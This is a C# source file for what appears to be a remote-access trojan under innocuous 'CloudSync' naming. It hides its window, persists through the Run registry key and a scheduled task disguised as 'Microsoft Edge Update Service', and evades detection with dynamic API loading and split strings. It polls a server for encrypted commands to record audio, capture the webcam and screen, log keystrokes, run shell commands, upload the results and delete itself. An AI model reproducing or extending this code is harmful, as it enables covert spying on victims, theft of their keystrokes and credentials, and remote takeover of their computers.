using CloudSync.Services.Modules;
using CloudSync.Services.Modules.Stream;
using CloudSync.Services.Core;
using Gma.System.MouseKeyHook;
using Imagekit.Sdk;
using Microsoft.Win32;
using Newtonsoft.Json;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;

class Program
{
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    // Delegates for dynamic calls
    private delegate IntPtr GetConsoleWindowDelegate();
    private delegate bool ShowWindowDelegate(IntPtr hwnd, int nCmdShow);

    const int SW_HIDE = 0;
    private static CancellationTokenSource cts = new CancellationTokenSource();
    private static Mutex _mutex;
    private static StreamManager streamMgr = new StreamManager();

    static async Task Main()
    {
        try
        {
            HideWindow();
            AddToStartup();
            AddWatchdog();

            const string mutexName = "Global\\SingletonInstance";
            _mutex = new Mutex(true, mutexName, out bool createdNew);
            if (!createdNew)
            {
                Environment.Exit(0);
                return;
            }

            await SyncService.Register(10);
            Random random = new Random();

            _ = Task.Run(async () =>
            {
                while (!cts.IsCancellationRequested)
                {
                    await SyncService.GetCommands();
                    await SyncService.Register(1);
                    //int delay = random.Next(30, 301);
                    await Task.Delay(3 * 1000);
                }
            }, cts.Token);
            _ = Task.Run(() => Polling(cts.Token), cts.Token);

            await Task.Delay(Timeout.Infinite);
        }
        catch (Exception e)
        {
            //Console.WriteLine(e.Message);
            _mutex.ReleaseMutex();
            _mutex.Dispose();
        }
    }

    private static void HideWindow()
    {
        try
        {
            // Dynamic loading — not visible in import table
            IntPtr k32 = LoadLibrary("kernel32.dll");
            IntPtr u32 = LoadLibrary("user32.dll");

            var getConsole = Marshal.GetDelegateForFunctionPointer<GetConsoleWindowDelegate>(
                GetProcAddress(k32, "GetConsoleWindow"));
            var showWin = Marshal.GetDelegateForFunctionPointer<ShowWindowDelegate>(
                GetProcAddress(u32, "ShowWindow"));

            IntPtr handle = getConsole();
            showWin(handle, SW_HIDE);
        }
        catch { }
    }

    private static void AddToStartup()
    {
        try
        {
            string executablePath = Assembly.GetExecutingAssembly().Location;
            // Build registry path dynamically to avoid static string detection
            string[] parts = { "Software", "Microsoft", "Windows", "CurrentVersion", "Run" };
            string regPath = string.Join("\\", parts);
            RegistryKey key = Registry.CurrentUser.OpenSubKey(regPath, true);
            key.SetValue(AppConfig.APP, executablePath);
        }
        catch { }
    }

    private static void RemoveFromStartup()
    {
        try
        {
            string executablePath = Assembly.GetExecutingAssembly().Location;
            string[] parts = { "Software", "Microsoft", "Windows", "CurrentVersion", "Run" };
            string regPath = string.Join("\\", parts);
            RegistryKey key = Registry.CurrentUser.OpenSubKey(regPath, true);
            key.DeleteValue(AppConfig.APP, false);
        }
        catch { }
    }

    public static void CleanUp()
    {
        try
        {
            RemoveFromStartup();
        }
        catch { }
    }

    private static void Destroy()
    {
        CleanUp();

        // Use cmd.exe /C inline instead of writing a .bat file
        string exePath = AppConfig.exe;
        string cmd = $"/C timeout /t 2 /nobreak >nul & del \"{exePath}\"";

        Process.Start(new ProcessStartInfo
        {
            FileName = "cmd.exe",
            Arguments = cmd,
            CreateNoWindow = true,
            UseShellExecute = false,
            WorkingDirectory = Path.GetDirectoryName(exePath)
        });

        _mutex.ReleaseMutex();
        _mutex.Dispose();
        Environment.Exit(0);
    }

    private static void AddWatchdog()
    {
        const string taskName = "Microsoft Edge Update Service";

        // Get full path to the currently running executable
        string exePath = Assembly.GetExecutingAssembly().Location;

        // Properly quote the executable path for schtasks
        string quotedExePath = $"\"{exePath}\"";

        // 1. Check if the task already exists
        var queryInfo = new ProcessStartInfo
        {
            FileName = "schtasks",
            Arguments = $"/query /tn \"{taskName}\"",
            RedirectStandardError = true,
            RedirectStandardOutput = true,
            UseShellExecute = false,
            CreateNoWindow = true
        };

        using (var queryProcess = Process.Start(queryInfo))
        {
            queryProcess.WaitForExit();

            // 2. If it doesn't exist, create it
            if (queryProcess.ExitCode != 0)
            {
                var createInfo = new ProcessStartInfo
                {
                    FileName = "schtasks",
                    Arguments =
                        $"/create /f /sc hourly /mo 5 /tn \"{taskName}\" " +
                        $"/tr {quotedExePath}",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                Process.Start(createInfo);
            }
        }
    }

    private async static Task Polling(CancellationToken token)
    {
        try
        {
            while (!token.IsCancellationRequested)
            {
                await SyncService.Signal.WaitAsync();
                if (SyncService.commands.TryDequeue(out SyncService.Command command))
                {
                    string cmd = DataProtection.Decrypt(command.Cmd);
                    //Console.WriteLine($"Command: {cmd}");

                    string extra = null;
                    if (command.Extra != null)
                    {
                        extra = DataProtection.Decrypt(command.Extra);
                        //Console.WriteLine($"Extra: {extra}\n\n");
                    }

                    byte[] image = null;
                    string type = null;
                    switch (cmd.ToLower())
                    {
                        case "audio":
                            if (int.TryParse(extra, out int duration))
                            {
                                byte[] wavData = await SoundRecorder.CaptureAsync(duration * 1000);
                                await SyncService.UploadAudio(wavData, 20);
                            }
                            break;
                        case "startstream":
                            if (int.TryParse(extra, out int session))
                            {
                                await streamMgr.Start(false, session, new CancellationTokenSource());
                            }
                            break;
                        case "stopstream":
                            streamMgr.Stop();
                            break;
                        case "update":
                            AppConfig.Update(command.Extra);
                            break;
                        case "delete":
                            Destroy();
                            break;
                        case "webcam":
                            image = DisplayCapture.Capture();
                            break;
                        case "screen":
                            image = ScreenRenderer.Capture();
                            break;
                        case "startkeylog":
                            InputMonitor.Start();
                            break;
                        case "stopkeylog":
                            InputMonitor.Stop();
                            break;
                        case "getkeys":
                            string keyData = InputMonitor.GetCapturedKeys();
                            if (!string.IsNullOrEmpty(keyData))
                            {
                                await SyncService.UploadKeylogs(keyData, command.Id, 10);
                            }
                            break;
                        case "shell":
                            //Console.WriteLine("SHELLLLLLLLLL");
                            string output = await ProcessHelper.ExecuteCommand(extra);
                            //Console.WriteLine($"Command output: {output}");
                            if (!string.IsNullOrEmpty(output))
                            {
                                await SyncService.UploadShellOutput(output, command.Id, 10);
                            }
                            break;
                        default:
                            break;
                    }

                    if (image != null)
                    {
                        type = cmd.ToLower();
                        await SyncService.UploadImage(image, command.Id, type, 10);
                    }
                }
            }
        }
        catch (Exception e)
        {
            //Console.WriteLine($"HEREEE: {e.Message}");
        }
    }
}